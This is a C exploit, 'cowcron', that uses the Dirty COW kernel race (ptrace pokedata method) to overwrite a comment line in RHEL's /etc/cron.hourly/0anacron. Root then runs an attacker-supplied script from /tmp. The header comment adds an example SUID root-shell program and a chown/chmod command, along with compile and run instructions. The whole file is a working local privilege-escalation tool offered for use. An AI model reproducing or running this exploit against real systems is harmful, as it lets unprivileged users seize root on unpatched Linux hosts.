/*
 This exploit leverages the pokemon exploit of the dirtycow vulnerability
 to write to the default 0anacron hourly crontab in RHEL. Any other script
 in the cron.* directories can be substituted for the 0anacron script. This 
 option was chosen over the common /etc/passwd file because it's less intrusive.
 The original /etc/cron.hourly/0anacron file is backed-up to /tmp/0anacron.bak,
 at which point a comment line is overwritten with a call to a file in /tmp.
 A path to a script in /tmp/ was chosen over a direct command due to size 
 limitiations in regard to the command and the comment being replaced in
 the cron script. Comments were chosen because they provide the least 
 possibility for unintended consequences when overwriting cron tasks.
 
 Example of command to put in /tmp/* script:
   chown root /home/<user>/shell;chmod +s /home/<user>/shell
   
 Example SUID binary - shell.c
   #define _GNU_SOURCE
   #include <stdlib.h>
   #include <unistd.h>
   void main(){
      int euid = geteuid();
      setresuid(euid,euid,euid);
      execl("/bin/bash", "/bin/bash",  NULL);
   }

 Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c

 Compile with:
   gcc -pthread cowcron.c -o cowcron

 Then run the newly create binary by typing:
   "./cowcron"

 Be sure to restore "/etc/cron.hourly/0anacron" after running the exploit
   mv /tmp/0anacron.bak /etc/cron.hourly/0anacron
 

 Exploit mashed-up by b0yd
 https://www.securifera.com
*/

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>

const char *filename = "/etc/cron.hourly/0anacron";
const char *backup_filename = "/tmp/0anacron.bak";
const char *cmd_str = "/tmp/%c";
const char *copy_cmd = "cp /etc/cron.hourly/0anacron /tmp/0anacron.bak";
const char *end = ";#";
void cow( char *inj_cmd, unsigned start_offset );

int f;
void *map;
char *inj_cmd;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg) {
   int i, c = 0;
   for(i = 0; i < 200000000; i++) {
      c += madvise(map, 100, MADV_DONTNEED);
   }
   //printf("[+] madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
   // check if target file already exists
   if(access(to, F_OK) != -1) {
      printf("[-] File %s already exists! Please delete it and run again\n",
      to);
      return -1;
   }

   //Copy using system because I'm lazy and don't want to redo permissions.
   system(copy_cmd);

   return 0;
}

void create_tmp( char* passed_str ){
   int fd;
   unsigned int lw_char;
   mode_t mode;

   //Get the necessary length
   int req_len = strlen(cmd_str) + strlen(end);
   inj_cmd = (char *)calloc(req_len, 1);

   /* initialize random seed: */
   srand (time(NULL));

   while( 1 ){
      //generate lowercase ascii char
      lw_char = rand() % (122 - 97) + 97;

      sprintf(inj_cmd, cmd_str, lw_char);
      if( access( inj_cmd, F_OK ) != -1 ) {
         // file exists
         continue;
      } else {
         // file doesn't exist
         mode = S_IRWXU | S_IRWXG | S_IRWXO;
         fd = creat(inj_cmd, mode);
         write(fd, passed_str, strlen(passed_str));
         close(fd);
         printf("[+] Script file written at %s", inj_cmd);
         puts("[+] Feel free to modify the script anytime before execution.\n");
         break;
      }	  
   }  
   strcat(inj_cmd, end);
   printf("[+] Inserting command: %s\n", inj_cmd);
}


void cow( char *inj_cmd, unsigned start_offset ){
	
   printf("[+] Writing \"%s\" at offset %d, Holdor...\n", inj_cmd, start_offset );
   pid = fork();
   if(pid) {
      waitpid(pid, NULL, 0);
      int u, i, o, c = 0;
      int l=strlen(inj_cmd);
      for(i = 0; i < 10000/l; i++) {
         for(o = 0; o < l; o++) {
            int offset = o + start_offset;
            for(u = 0; u < 10000; u++) {
               c += ptrace(PTRACE_POKETEXT, pid, map + offset, *((long*)(inj_cmd + o)));
            }
         }
      }
      //printf("[+] ptrace %d\n",c);
   } else {
      pthread_create(&pth, NULL, madviseThread, NULL);
      ptrace(PTRACE_TRACEME);
      kill(getpid(), SIGSTOP);
      pthread_join(pth,NULL);
   }

   printf("[+] Done! Check %s to see if the new line was added.\n", filename);
   printf("[*] Be sure to restore %s to %s\n", backup_filename, filename );
 
}

char *get_command(){
	
	char *line = NULL;
    size_t len = 0;
    ssize_t read;
	
	printf("Enter the command you want executed as root.\n");
	printf("> ");
	
	read = getline(&line, &len, stdin);
	if( read == 1 ){
      puts("[-] No command entered. Exiting");
      exit(0);
    }
	
	return line;
}

int main(int argc, char *argv[]){
   
   // backup file
   int ret = copy_file(filename, backup_filename);
   if (ret != 0) {
      exit(ret);
   }

   char *cmd = get_command();
   printf("[-] Command entered: %s\n", cmd);

   //Create the tmp file with executable permissions   
   create_tmp(cmd);

   f = open(filename, O_RDONLY);
   fstat(f, &st);
   map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
   //printf("[+] mmap: %lx\n",(unsigned long)map);		
   char *file_contents = (char *)calloc(st.st_size + sizeof(long) + 1, 1);
   memcpy(file_contents, map, st.st_size);

   char *start = strstr(file_contents, "\n\n#");
   //printf("Offset: %x\n", start);
   if( start ){
      start += 2;
      //printf("Start: \n%s\n", start);
      char *end = strstr(start, "\n");
      //printf("Offset: %x\n", end);
      if( end ){
         char *comment = (char *)calloc(end - start + 1, 1);
         memcpy(comment, start, end - start);
         printf("[+] Found comment that can be replaced: \n\t%s\n", comment);
         cow( inj_cmd, start - file_contents );
         free(comment);	  
      }
   } else {
      puts("[-] Unable to locate any comments in the file to replace.\n");  
   }

   //Free resources
   free(file_contents);
   free(inj_cmd);
   free(cmd);
   close(f);

   return 0;
  
} 
